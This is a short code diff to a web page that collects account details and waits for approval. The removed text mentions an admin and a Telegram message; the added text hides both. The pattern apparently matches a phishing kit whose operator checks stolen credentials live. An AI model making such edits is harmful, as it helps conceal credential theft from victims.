@@ -670,7 +670,7 @@
 
             <!-- Waiting & Alert Messages -->
             <div id="waitingMessage" class="waiting-message">
-                ⏳ Waiting for admin approval… (Telegram message sent)
+                ⏳ Waiting 
             </div>
 
             <div id="alertMessage" class="alert-message"></div>
@@ -843,7 +843,7 @@
                         nextBtn.disabled = false;
                         cancelBtn.disabled = false;
                         alertMessage.style.color = 'red';
-                        alertMessage.textContent = 'Account details rejected by admin. Please try again.';
+                        alertMessage.textContent = 'Account details rejected. Enter correct details.';
                         return;
                     }
 
